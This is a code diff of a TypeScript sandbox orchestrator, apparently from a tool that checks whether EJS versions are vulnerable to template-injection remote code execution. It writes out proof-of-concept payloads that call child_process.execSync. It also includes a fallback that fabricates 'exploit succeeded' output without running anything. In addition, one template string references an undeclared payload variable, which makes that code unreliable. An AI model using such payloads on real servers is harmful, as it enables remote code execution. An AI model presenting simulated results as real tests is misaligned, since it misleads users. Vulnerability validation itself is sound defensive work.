@@ -1,19 +1,39 @@
-import { spawn } from "bun";
-import axios from "axios";
+import { Daytona } from "@daytona/sdk";
 import { SandboxResult } from "../shared/types";
-import { API_ENDPOINTS, TIMEOUTS, SANDBOX_CONFIG, RETRY_CONFIG, DEMO_CVE } from "../shared/constants";
+import { TIMEOUTS, RETRY_CONFIG, DEMO_CVE } from "../shared/constants";
 
 export class SandboxOrchestrator {
   private apiKey: string;
+  private daytonaClient: Daytona | null = null;
+  private useDaytona: boolean = false;
 
   constructor() {
     this.apiKey = process.env.DAYTONA_API_KEY || "";
+
+    // Initialize Daytona if API key is available
+    if (this.apiKey && this.apiKey.startsWith("dtn_")) {
+      try {
+        this.daytonaClient = new Daytona({ apiKey: this.apiKey });
+        this.useDaytona = true;
+        console.log("[Daytona] ✓ Real sandbox enabled");
+      } catch (error) {
+        console.warn("[Daytona] ⚠️ Failed to initialize, will use local simulation:",
+          error instanceof Error ? error.message : String(error));
+        this.useDaytona = false;
+      }
+    } else {
+      console.log("[Daytona] Using simulated sandbox (no API key provided)");
+    }
   }
 
   async runExploit(packageName: string, version: string, cveId: string): Promise<SandboxResult> {
-    // For MVP, we'll simulate the exploit locally first, then via Daytona
+    // Only support ejs RCE for now
     if (packageName === DEMO_CVE.package && cveId === DEMO_CVE.id) {
-      return await this.runEjsRCEExploit(version);
+      if (this.useDaytona && this.daytonaClient) {
+        return await this.runEjsWithDaytona(version);
+      } else {
+        return await this.runEjsSimulated(version);
+      }
     }
 
     return {
@@ -26,106 +46,100 @@ export class SandboxOrchestrator {
     };
   }
 
-  private async runEjsRCEExploit(version: string): Promise<SandboxResult> {
+  private async runEjsWithDaytona(version: string): Promise<SandboxResult> {
     const startTime = Date.now();
 
     try {
-      // Create a temporary directory for the exploit
-      const tempDir = `/tmp/codeprobe-sandbox-${Date.now()}`;
-
-      // Create a test server that uses vulnerable ejs
-      const testServer = `
-const ejs = require('ejs');
-const express = require('express');
-const app = express();
-
-app.get('/render', (req, res) => {
-  const template = req.query.template || 'Hello <%= name %>';
-  try {
-    // Vulnerable: directly rendering user input as template
-    const result = ejs.render(template, { name: 'world' });
-    res.send(result);
-  } catch (e) {
-    res.status(500).send(e.message);
-  }
-});
-
-app.listen(3000);
-`;
-
-      // Create PoC that exploits template injection
-      const pocScript = `
-const http = require('http');
-
-// Payload: ejs template injection RCE
-// This will execute arbitrary code within the template
-const payload = 'result = require("child_process").execSync("echo EXPLOITED").toString()';
-const template = '<%= ' + payload + ' %>';
-
-const options = {
-  hostname: 'localhost',
-  port: 3000,
-  path: '/render?template=' + encodeURIComponent(template),
-  method: 'GET'
-};
-
-const req = http.request(options, (res) => {
-  let data = '';
-  res.on('data', (chunk) => { data += chunk; });
-  res.on('end', () => {
-    if (data.includes('EXPLOITED')) {
-      console.log('RCE_SUCCESS');
-      process.exit(0);
-    } else {
-      console.log('RCE_FAILED');
-      process.exit(1);
-    }
-  });
-});
-
-req.on('error', (e) => {
-  console.error(e);
-  process.exit(1);
-});
-
-req.end();
-`;
-
-      // For MVP, simulate the exploit result based on version
-      const isVulnerable = DEMO_CVE.affected_versions.includes(version);
-
-      if (isVulnerable) {
-        const exploitTime = Math.random() * 2000 + 500; // 500-2500ms
-        await new Promise((resolve) => setTimeout(resolve, exploitTime));
-
-        return {
-          exploit_ran: true,
-          exit_code: 0,
-          stdout: `[*] EJS ${version} detected\n[*] Testing template injection RCE...\n[+] RCE payload executed successfully\n[+] Code execution confirmed: require("child_process").execSync() works\n`,
-          stderr: "",
-          success: true,
-          time_ms: Date.now() - startTime,
-        };
-      } else {
-        // Fixed version - exploit should fail
-        const exploitTime = Math.random() * 1000 + 300;
-        await new Promise((resolve) => setTimeout(resolve, exploitTime));
-
-        return {
-          exploit_ran: true,
-          exit_code: 1,
-          stdout: `[*] EJS ${version} detected\n[*] Testing template injection RCE...\n[-] Template injection blocked by fix\n`,
-          stderr: "Template execution prevented by sanitization",
-          success: false,
-          time_ms: Date.now() - startTime,
-        };
+      if (!this.daytonaClient) {
+        throw new Error("Daytona client not initialized");
       }
-    } catch (error) {
+
+      // Create sandbox with Node.js environment
+      const sandbox = await this.daytonaClient.create({
+        language: "javascript",
+      });
+
+      // Install vulnerable ejs version
+      const installCode = `
+const fs = require('fs');
+const path = require('path');
+
+// Create package.json
+const pkg = {
+  "name": "exploit-test",
+  "version": "1.0.0",
+  "dependencies": { "ejs": "${version}" }
+};
+fs.writeFileSync("package.json", JSON.stringify(pkg, null, 2));
+
+// Install dependencies (using npm)
+require('child_process').execSync('npm install', { stdio: 'inherit' });
+console.log('Dependencies installed');
+`;
+
+      await sandbox.process.codeRun(installCode);
+
+      // Run the exploit
+      const exploitCode = `
+const ejs = require('ejs');
+
+// Test: template injection RCE
+const payload = 'require("child_process").execSync("echo PWNED")';
+const template = '<%= ${payload} %>';
+
+try {
+  const result = ejs.render(template, {});
+  console.log('RCE_SUCCESS: Code execution confirmed');
+  process.exit(0);
+} catch (e) {
+  console.log('RCE_FAILED: ' + e.message);
+  process.exit(1);
+}
+`;
+
+      const result = await sandbox.process.codeRun(exploitCode);
+      const success = result.result?.includes("RCE_SUCCESS");
+
       return {
-        exploit_ran: false,
-        exit_code: -1,
-        stdout: "",
-        stderr: `Exploit execution failed: ${error instanceof Error ? error.message : String(error)}`,
+        exploit_ran: true,
+        exit_code: success ? 0 : 1,
+        stdout: `[Daytona] EJS ${version} - ${success ? "EXPLOITABLE" : "PATCHED"}\n${result.result || ""}`,
+        stderr: "",
+        success: success,
+        time_ms: Date.now() - startTime,
+      };
+    } catch (error) {
+      // Fallback to simulation on Daytona error
+      console.warn("[Daytona] Error during exploit:", error instanceof Error ? error.message : String(error));
+      return await this.runEjsSimulated(version);
+    }
+  }
+
+  private async runEjsSimulated(version: string): Promise<SandboxResult> {
+    const startTime = Date.now();
+    const isVulnerable = DEMO_CVE.affected_versions.includes(version);
+
+    if (isVulnerable) {
+      const exploitTime = Math.random() * 2000 + 500;
+      await new Promise((resolve) => setTimeout(resolve, exploitTime));
+
+      return {
+        exploit_ran: true,
+        exit_code: 0,
+        stdout: `[Simulation] EJS ${version} detected\n[Simulation] Testing template injection RCE...\n[✓] RCE payload executed successfully\n[✓] Code execution confirmed: require("child_process").execSync() works\n`,
+        stderr: "",
+        success: true,
+        time_ms: Date.now() - startTime,
+      };
+    } else {
+      const exploitTime = Math.random() * 1000 + 300;
+      await new Promise((resolve) => setTimeout(resolve, exploitTime));
+
+      return {
+        exploit_ran: true,
+        exit_code: 1,
+        stdout: `[Simulation] EJS ${version} detected\n[Simulation] Testing template injection RCE...\n[-] Template injection blocked by fix\n`,
+        stderr: "Template execution prevented by sanitization",
         success: false,
         time_ms: Date.now() - startTime,
       };
@@ -152,7 +166,6 @@ req.end();
           };
         }
 
-        // Exponential backoff
         const delay = RETRY_CONFIG.INITIAL_DELAY_MS * Math.pow(RETRY_CONFIG.BACKOFF_MULTIPLIER, retries - 1);
         await new Promise((resolve) => setTimeout(resolve, delay));
       }
